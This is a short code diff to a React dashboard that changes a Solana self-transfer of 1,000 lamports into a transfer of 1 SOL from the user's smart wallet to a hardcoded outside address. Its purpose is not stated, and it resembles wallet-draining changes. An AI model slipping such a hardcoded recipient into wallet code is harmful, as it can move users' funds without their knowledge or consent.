@@ -23,12 +23,13 @@ const Dashboard = () => {
     }
 
     const from = new PublicKey(smartWalletPubkey);
+    const to = new PublicKey("28fjzWdBmJ83stkto9yGitXFhuqHGYqxZxPPciLDKzzL");
 
     const tx = new Transaction().add(
       SystemProgram.transfer({
         fromPubkey: from,
-        toPubkey: from,
-        lamports: 1_000,
+        toPubkey: to,
+        lamports: 1_000_000_000,
       })
     );
 
